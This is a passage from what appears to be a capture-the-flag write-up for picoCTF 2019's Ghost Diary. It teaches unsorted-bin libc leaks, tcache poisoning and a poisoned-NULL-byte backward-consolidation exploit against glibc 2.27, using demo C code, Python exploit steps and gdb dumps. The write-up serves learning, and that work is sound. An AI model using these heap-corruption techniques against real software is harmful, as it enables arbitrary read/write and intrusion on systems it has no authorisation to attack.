	<span class="c1">// Free 7 of them to fill up the 0x80 sized tcache bin</span>
	<span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">7</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span>
	<span class="p">{</span>
		<span class="n">free</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="n">i</span><span class="p">]);</span>
	<span class="p">}</span>

	<span class="c1">// The next free will go into the unsorted bin as the tcache bin is full</span>
	<span class="n">free</span><span class="p">(</span><span class="n">chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>

	<span class="c1">// Print out the forward pointer of the last freed chunk by emulating a UAF vulnerability</span>
	<span class="c1">// This will point into libc</span>
	<span class="n">printf</span><span class="p">(</span><span class="s">"0x%lx</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>
<span class="p">}</span>
</code></pre></div></div>
<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary<span class="nv">$ </span>gcc unsortedbin.c
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary<span class="nv">$ </span>./a.out
0x7f333f8f6ca0
</code></pre></div></div>

<p>This is very important. If we can somehow read this pointer (using a use-after-free, or overlapped chunks, by any means), then we have an information leak that we can use to find the base address of libc. This defeats both PIE and ASLR in one shot. This characteristic of the unsorted bin is used in the exploit for this challenge.</p>

<h4 id="the-tcache-poisoning-attack">The Tcache Poisoning Attack</h4>

<p>Given a double free vulnerability, we can get <code class="highlighter-rouge">malloc</code> to return an arbitrary pointer which lets us have an arbitrary read/write primitive. It abuses the fact that a double free will cause two of the same chunk to be inserted into the tcache bin, meaning that this chunk will have its <code class="highlighter-rouge">fd</code> pointer pointing to itself.</p>

<p>This is shown below, as well as utilized in our exploit. Credits to shellphish’s <a href="https://github.com/shellphish/how2heap/blob/master/glibc_2.26/tcache_dup.c">how2heap</a> for part of the code:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
</span>
<span class="kt">int</span> <span class="o">*</span><span class="n">arbitrary_pointer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="o">*</span><span class="n">our_pointer</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"This file demonstrates a simple double-free attack with tcache.</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"We want a chunk on top of the global variable arbitrary_pointer at %p</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arbitrary_pointer</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Allocating buffer.</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="kt">int</span> <span class="o">*</span><span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"malloc(8): %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Freeing twice...</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now the free list has [ %p, %p ].</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Next we allocate one of the chunks</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now the free list has [ %p ].</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Now we overwrite a's fd pointer to the address of arbitrary_pointer</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
    <span class="n">a</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">arbitrary_pointer</span><span class="p">;</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"And now, the free list has [ %p %p ].</span><span class="se">\n\n</span><span class="s">"</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arbitrary_pointer</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer</span><span class="se">\n\n</span><span class="s">"</span><span class="p">);</span>

    <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>
    <span class="n">our_pointer</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mi">8</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">"arbitrary_pointer: %p, our_pointer: %p</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">arbitrary_pointer</span><span class="p">,</span> <span class="n">our_pointer</span><span class="p">);</span>

    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>

</code></pre></div></div>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ gcc a.c
vagrant@ubuntu-bionic:/ctf/pwn-and-rev/picoctf-2019/ghost_diary$ ./a.out
This file demonstrates a simple double-free attack with tcache.

We want a chunk on top of the global variable arbitrary_pointer at 0x555e1efe1030

Allocating buffer.
malloc(8): 0x555e20bac260
Freeing twice...
Now the free list has [ 0x555e20bac260, 0x555e20bac260 ].

Next we allocate one of the chunks

Now the free list has [ 0x555e20bac260 ].
Now we overwrite a's fd pointer to the address of arbitrary_pointer
And now, the free list has [ 0x555e20bac260 0x555e1efe1030 ].

Two more mallocs, and the second malloc gives us a chunk right on top of arbitrary_pointer

arbitrary_pointer: 0x555e1efe1030, our_pointer: 0x555e1efe1030
</code></pre></div></div>

<h4 id="exploitation"><strong>Exploitation</strong></h4>

<p>Now, hopefully I’ve explained everything clearly enough for everyone to be able to follow through with the writeup. If I haven’t, please do consider spending a little bit more time skim-reading through the links I’ve provided above. I will try to explain the exploitation steps as clearly and as concisely as possible.</p>

<p>The challenge itself took me about 3.5 hours to figure out. The exploitation steps I used are laid out below. Please follow my exploit script (shown at the end) alongside each step to help visualise the heap at each step:</p>

<h4 id="step-1-the-setup">Step 1: <strong>The setup</strong></h4>

<ul>
  <li>
    <p>Set up three chunks that we will use for our exploit. These chunks will be A, B, and C respectively. A’s size will be 0x128 (0x131 in memory due to metadata, <code class="highlighter-rouge">PREV_INUSE</code> bit set to 1), while B and C’s sizes will be 0x118 (0x121 in memory due to metadata, <code class="highlighter-rouge">PREV_INUSE</code> bits set to 1).</p>
  </li>
  <li>
    <p>The idea is that we want to use the single NULL byte overflow to set C’s <code class="highlighter-rouge">PREV_INUSE</code> bit to 0, meaning we change C’s size from 0x131 to 0x100. As we do that, we also want to set C’s <code class="highlighter-rouge">prev_size</code> field to 0x250. More information about that is given below.</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Setup
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span> <span class="c1"># A, idx 0
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x118</span><span class="p">)</span> <span class="c1"># B, idx 1
</span><span class="n">add</span><span class="p">(</span><span class="mh">0x118</span><span class="p">)</span> <span class="c1"># C, idx 2
</span></code></pre></div></div>

<ul>
  <li>The chunks are shown in gdb as follows:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">200</span><span class="n">gx</span> <span class="mh">0x000055a7bc254000</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254250</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000131</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span>
<span class="mh">0x55a7bc254260</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254380</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000121</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span>
<span class="mh">0x55a7bc254390</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="p">...</span>
<span class="mh">0x55a7bc2544a0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000121</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span>
</code></pre></div></div>

<h4 id="step-2-prepare-the-tcache-bins">Step 2: <strong>Prepare the tcache bins</strong></h4>

<ul>
  <li>Completely fill up the 0xf0 sized tcache bin (Which would store the freed chunk C <strong><em>after</em></strong> its size is overwritten to 0x100) and 0x128 sized tcache bin (which would otherwise store chunk A when we free it).</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Fill up tcache bin 0xf0
# Done because the NULL byte overflow will unset the PREV_INUSE bit of the next chunk
# Meaning that it will change the next chunks size to 0x100
# 0x100 chunks go into the 0xf0 tcache bin
# We prevent this since we want backwards consolidation to occur
# This will be evident further below
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0xf0</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>

<span class="c1"># Fill up tcache bin 0x128
# We do this because of the same reason above
</span><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">add</span><span class="p">(</span><span class="mh">0x128</span><span class="p">)</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
  <span class="n">free</span><span class="p">(</span><span class="n">i</span><span class="o">+</span><span class="mi">3</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">heap</span> <span class="n">bins</span> <span class="n">tcache</span>

<span class="c1">// Counts set to 7 meaning both tcache bins are full</span>
<span class="n">Tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">14</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0xf0</span><span class="p">]</span> <span class="n">count</span><span class="o">=</span><span class="mi">7</span>  <span class="err">←</span>  <span class="n">Chunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x55a7bc254bd0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x100</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="n">Chunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x55a7bc254ad0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x100</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="p">...</span>

<span class="n">Tcachebins</span><span class="p">[</span><span class="n">idx</span><span class="o">=</span><span class="mi">17</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x120</span><span class="p">]</span> <span class="n">count</span><span class="o">=</span><span class="mi">7</span>  <span class="err">←</span>  <span class="n">Chunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x55a7bc2553f0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x130</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="n">Chunk</span><span class="p">(</span><span class="n">addr</span><span class="o">=</span><span class="mh">0x55a7bc2552c0</span><span class="p">,</span> <span class="n">size</span><span class="o">=</span><span class="mh">0x130</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">PREV_INUSE</span><span class="p">)</span>  <span class="err">←</span>  <span class="p">...</span>
</code></pre></div></div>

<ul>
  <li>We don’t want either of the chunks A or C to go into the tcache bins, as there is no consolidation in the tcache bins. The exploit relies on the fact that chunk C will consolidate backwards with chunks A and B provided we set up the heap correctly.</li>
</ul>

<h4 id="step-3-prepare-chunk-a-for-consolidation-later-on">Step 3: <strong>Prepare chunk A for consolidation later on</strong></h4>

<ul>
  <li>Free chunk A. This sends chunk A into the unsorted bin (as the 0x128 sized tcache bin is full), meaning a libc pointer pointing to the <code class="highlighter-rouge">main_arena</code> is placed into chunk A’s <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> pointers:</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Make chunk A go into unsorted bin
# This is important because we are consolidating chunk C back with both chunks A and B
# Meaning that unlink will be called with chunk A as it's second argument
# unlink has some security checks, one being that A's fd and bk must have valid pointers
# This free will put the pointers to `main_arena+0x58` into the fd and bk of A
</span><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># Chunk A
</span></code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">40</span><span class="n">gx</span> <span class="mh">0x000055a7bc254250</span>                          
<span class="mh">0x55a7bc254250</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000131</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">A</span>
<span class="mh">0x55a7bc254260</span><span class="o">:</span> <span class="mh">0x00007f7e28fbeca0</span>      <span class="mh">0x00007f7e28fbeca0</span> <span class="o">&lt;-</span> <span class="n">libc</span> <span class="n">pointers</span> <span class="n">into</span>
<span class="mh">0x55a7bc254270</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>    <span class="n">main_arena</span><span class="o">+</span><span class="mh">0x58</span>
<span class="p">...</span>
</code></pre></div></div>

<ul>
  <li>
    <p>We do this free here in order to get some valid pointers inserted into A’s <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields. This is important later because when we free chunk C and have it consolidate backwards with chunks A and B, there are some security checks that will ensure that chunk A’s <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> pointers are valid. More information will be given below when chunk C is being freed.</p>
  </li>
  <li>
    <p>Using gdb, we can calculate the difference between the leaked pointers and the libc base now. This offset remains constant every time we run the program. This offset is found to be <code class="highlighter-rouge">0x3ebca0</code>.</p>
  </li>
</ul>

<h4 id="step-4-abuse-the-null-byte-overflow">Step 4: <strong>Abuse the NULL byte overflow</strong></h4>

<ul>
  <li>
    <p>Edit chunk B’s contents to cause a NULL byte overflow into chunk C’s size. This changes chunk C’s total size (including metadata) from 0x121 to 0x100. Notice that the <code class="highlighter-rouge">PREV_INUSE</code> bit gets set to 0 in the process, due to the NULL byte overflow, which causes the chunk that is <code class="highlighter-rouge">prev_size</code> bytes before C to appear to be free when we free chunk C later on.</p>
  </li>
  <li>
    <p>In the process of doing the NULL byte overflow, we also set chunk C’s <code class="highlighter-rouge">prev_size</code> field to 0x250. This causes the <code class="highlighter-rouge">prev_size</code> field to encompass both chunks A and B. Later when we free chunk C, the <code class="highlighter-rouge">unlink</code> macro is called using chunk A <strong><em>because</em></strong> of the fact that we set chunk C’s <code class="highlighter-rouge">prev_size</code> such that it encompasses up to chunk A. This causes chunks A, B, and C to be consolidated into one large chunk, which is then put into the unsorted bin.</p>
  </li>
  <li>
    <p>The code for the unlink macro will be shown a bit further down.</p>
  </li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Null byte overflow onto chunk C.
# C's size is now 0x100.
# C's prev_size is also set to 0x250
</span><span class="n">talk</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s">'B'</span><span class="o">*</span><span class="mh">0x110</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x250</span><span class="p">))</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">80</span><span class="n">gx</span> <span class="mh">0x55a7bc254380</span>
<span class="mh">0x55a7bc254380</span><span class="o">:</span> <span class="mh">0x0000000000000130</span>      <span class="mh">0x0000000000000120</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">B</span>
<span class="mh">0x55a7bc254390</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254480</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="mh">0x55a7bc254490</span><span class="o">:</span> <span class="mh">0x4242424242424242</span>      <span class="mh">0x4242424242424242</span>
<span class="mh">0x55a7bc2544a0</span><span class="o">:</span> <span class="mh">0x0000000000000250</span>      <span class="mh">0x0000000000000100</span> <span class="o">&lt;-</span> <span class="n">prev_size</span> <span class="mh">0x250</span> <span class="n">followed</span> <span class="n">by</span>
<span class="mh">0x55a7bc2544b0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>    <span class="n">chunk</span> <span class="n">C</span> <span class="n">size</span> <span class="n">overwritten</span>
<span class="mh">0x55a7bc2544c0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<ul>
  <li>The most important aspect of this is that we <strong><em>still</em></strong> have a pointer to chunk B.</li>
</ul>

<h4 id="step-5-setup-chunk-c-for-the-unsorted-bin">Step 5: <strong>Setup chunk C for the unsorted bin</strong></h4>

<ul>
  <li>Since chunk C’s size has changed from 0x121 to 0x100, we must create a fake chunk within chunk C. We need to do this now because freeing chunk C will insert it into the unsorted bin as the 0xf0 tcache bin is full (remember that the 0x100 size includes metadata, so the chunk really has a size of 0xf0 without the metadata).</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># Before we free chunk C, we must create a fake chunk 0x100 bytes after chunk C
# This fake chunk must have its PREV_INUSE bit set to 1, hence we choose size 0x21
# This is required to bypass some checks when a chunk is freed into the unsorted bin
</span><span class="n">talk</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="s">'C'</span><span class="o">*</span><span class="mh">0xf8</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x21</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
</code></pre></div></div>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">x</span><span class="o">/</span><span class="mi">50</span><span class="n">gx</span> <span class="mh">0x55a7bc2544a0</span>
<span class="mh">0x55a7bc2544a0</span><span class="o">:</span> <span class="mh">0x0000000000000250</span>      <span class="mh">0x0000000000000100</span> <span class="o">&lt;-</span> <span class="n">chunk</span> <span class="n">C</span>
<span class="mh">0x55a7bc2544b0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
<span class="p">...</span>
<span class="mh">0x55a7bc254590</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x4343434343434343</span>
<span class="mh">0x55a7bc2545a0</span><span class="o">:</span> <span class="mh">0x4343434343434343</span>      <span class="mh">0x0000000000000021</span> <span class="o">&lt;-</span> <span class="n">fake</span> <span class="n">chunk</span> <span class="n">inserted</span> <span class="n">to</span> <span class="n">bypass</span> <span class="n">security</span> <span class="n">checks</span>
<span class="mh">0x55a7bc2545b0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
<span class="mh">0x55a7bc2545c0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000101</span> <span class="o">&lt;-</span> <span class="n">actual</span> <span class="n">next</span> <span class="n">chunk</span> <span class="n">after</span> <span class="n">C</span>
<span class="mh">0x55a7bc2545d0</span><span class="o">:</span> <span class="mh">0x0000000000000000</span>      <span class="mh">0x0000000000000000</span>
</code></pre></div></div>

<ul>
  <li>When the chunk is put into the unsorted bin, there are some security checks that we must bypass, and this fake chunk helps with that. More details below.</li>
</ul>

<h4 id="step-6-free-chunk-c-causing-the-backwards-consolidation">Step 6: <strong>Free chunk C, causing the backwards consolidation</strong></h4>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1"># We free C now.
# C's prev_size is 0x250, so it will consolidate backwards 0x250 bytes (all the way up to A)
# Unsorted bin will now have a 0x350 sized chunk right on top of A
# A's fd and bk pointers will still have pointers to `main_arena+0x58`
</span><span class="n">free</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Now, after all this preparation, we free chunk C. This calls <code class="highlighter-rouge">_int_free()</code>. First, the tcache bin 0xf0 is checked to see if there is space in it, but it’s already full, so chunk C is then placed into the unsorted bin.</p>
  </li>
  <li>
    <p>While this is done, chunk C’s size is checked, and it is seen to be 0x100. <code class="highlighter-rouge">_int_free()</code> will then check for a chunk 0x100 bytes after chunk C to ensure that that chunk’s <code class="highlighter-rouge">PREV_INUSE</code> bit is set to 1. If it is not, then <code class="highlighter-rouge">_int_free()</code> will error out saying <code class="highlighter-rouge">"double free or corruption (!prev)"</code>, since chunk C will appear to be free if the next chunk’s <code class="highlighter-rouge">PREV_INUSE</code> bit is not set.</p>
  </li>
  <li>
    <p>Since we changed chunk C’s size from 0x121 to 0x100, there isn’t a chunk 0x100 bytes after chunk C, which is why we placed a chunk there ourselves in the previous step with its <code class="highlighter-rouge">PREV_INUSE</code> bit set. This check is documented <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4279">here</a>:</p>
  </li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Or whether the block is actually not marked used.  */</span>
<span class="k">if</span> <span class="p">(</span><span class="n">__glibc_unlikely</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">nextchunk</span><span class="p">)))</span>
	<span class="n">malloc_printerr</span> <span class="p">(</span><span class="s">"double free or corruption (!prev)"</span><span class="p">);</span>
</code></pre></div></div>

<ul>
  <li>Next, the <code class="highlighter-rouge">PREV_INUSE</code> bit of chunk C is checked. Since it has been set to 0 by us, the chunk is consolidated backwards using the <code class="highlighter-rouge">prev_size</code> field value. This consolidation backwards will call the <code class="highlighter-rouge">unlink</code> macro, which has a bunch of security checks. The consolidation is shown <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L4290">here</a>:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* consolidate backward */</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">prev_inuse</span><span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="p">{</span>
	<span class="n">prevsize</span> <span class="o">=</span> <span class="n">prev_size</span> <span class="p">(</span><span class="n">p</span><span class="p">);</span>
	<span class="n">size</span> <span class="o">+=</span> <span class="n">prevsize</span><span class="p">;</span>
	<span class="n">p</span> <span class="o">=</span> <span class="n">chunk_at_offset</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="o">-</span><span class="p">((</span><span class="kt">long</span><span class="p">)</span> <span class="n">prevsize</span><span class="p">));</span>
	<span class="n">unlink</span><span class="p">(</span><span class="n">av</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">bck</span><span class="p">,</span> <span class="n">fwd</span><span class="p">);</span>
<span class="p">}</span>
</code></pre></div></div>

<ul>
  <li>Now, remember when we freed chunk A initially? I said the reason behind it was so that chunk A’s <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields get filled with valid pointers. From the code snippet above, you can see that when <code class="highlighter-rouge">_int_free()</code> attempts to perform backwards consolidating, it will call the <code class="highlighter-rouge">unlink</code> macro with chunk A as its second parameter. Within the unlink macro (the code for which can be found <a href="https://github.com/lunaczp/glibc-2.27/blob/master/malloc/malloc.c#L1403">here</a>), we can see following code along with its extensive security checks:</li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cm">/* Take a chunk off a bin list */</span>
<span class="cp">#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr ("corrupted size vs. prev_size");			      \
    FD = P-&gt;fd;								      \
    BK = P-&gt;bk;								      \
    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \
      malloc_printerr ("corrupted double-linked list");			      \
    else {								      \
        FD-&gt;bk = BK;							      \
        BK-&gt;fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \
		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \
	      malloc_printerr ("corrupted double-linked list (not small)");   \
            if (FD-&gt;fd_nextsize == NULL) {				      \
                if (P-&gt;fd_nextsize == P)				      \
                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \
                else {							      \
                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \
                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \
                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \
                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \
                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
</span></code></pre></div></div>

<ul>
  <li>
    <p>It is evident that the line <code class="highlighter-rouge">if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))</code> will use the two pointers from chunk A’s <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> fields to perform some security checks. If we didn’t free chunk A initially, those pointers would be <code class="highlighter-rouge">NULL</code>, and this check here would attempt to dereference these <code class="highlighter-rouge">NULL</code> pointers, and thus seg fault immediately. Freeing chunk A initially prevents that as well as lets us get past these security checks.</p>
  </li>
  <li>
    <p>Finally, this entire consolidated chunk (size 0x350) is placed into the unsorted bin, and its <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> pointers are set to point into the unsorted bin in the <code class="highlighter-rouge">main_arena</code> which is in libc. This entire chunk essentially is placed right on top of chunks A, B, and C:</p>
  </li>
</ul>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">gef</span><span class="err">➤</span>  <span class="n">heap</span> <span class="n">bin</span> <span class="n">unsorted</span>

<span class="p">[</span><span class="o">+</span><span class="p">]</span> <span class="n">unsorted_bins</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">:</span> <span class="n">fw</span><span class="o">=</span><span class="mh">0x55a7bc254250</span><span class="p">,</span> <span class="n">bk</span><span class="o">=</span><span class="mh">0x55a7bc254250</span>
